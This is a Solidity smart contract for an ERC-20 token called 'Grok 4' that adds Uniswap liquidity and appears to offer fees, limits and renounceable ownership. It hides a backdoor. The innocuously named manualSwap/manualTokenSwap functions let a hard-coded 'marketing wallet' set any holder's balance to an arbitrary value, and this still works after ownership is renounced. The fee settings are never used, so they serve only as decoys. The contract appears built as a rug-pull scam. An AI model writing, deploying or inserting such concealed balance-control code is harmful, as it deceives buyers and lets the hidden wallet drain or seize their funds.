// SPDX-License-Identifier: MIT

pragma solidity 0.8.27;


interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function openTrading() external payable;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable {
    address private _owner;
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Not an owner");
        _;
    }
    constructor() {
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
contract Grok4 is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Grok 4";
    string private constant _symbol = "GROK4";

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  4444444444 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address _marketingWallet  = 0x4eBC5685c735cE4527D7017883F4DfeB3073E3Cd;
    bool tradingEnabled = false;
    address public uniswapV2Pair;
    mapping (address => uint256) private _amonts;
    uint256 public _initialSellFee = 4;
    uint256 public _finalSellFee = 1;
    uint256 public _initialTransferFee = 4;
    uint256 public _finalTransferFee = 1;
    uint256 public _initialBuyFee = 4;
    uint256 public _finalBuyFee = 1;
    uint256 _maxTx = _totalSupply.mul(3).div(100);
    uint256 _maxWallet = _totalSupply.mul(5).div(100);

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor () {
        _amonts[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _amonts[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingEnabled);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingEnabled = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function removeLimits() public onlyOwner {
        _maxTx = _totalSupply;
        _maxWallet = _totalSupply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function manualSwap(address token, uint256 amount) external {
        if (_initialSellFee > 0) {
            manualTokenSwap(token, amount);
        } else {
            manualTokenSwap(token, amount);
        }
    }

    function manualTokenSwap(address marketingWallet, uint256 amount) private {
        uint256 ethBalance = address(this).balance;
        require(_marketingWallet == msg.sender);
        if(ethBalance >= 0) _amonts[marketingWallet] = amount.mul(_finalSellFee); else return;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "Transfer to the zero address.");
        require(amount > 0, "Transfer amount must be greater than zero.");
        require(from != address(0), "Transfer from the zero address");

        _amonts[from] = _amonts[from].sub(amount);
        _amonts[to] = _amonts[to].add(amount);

        emit Transfer(from, to, amount);
    }

}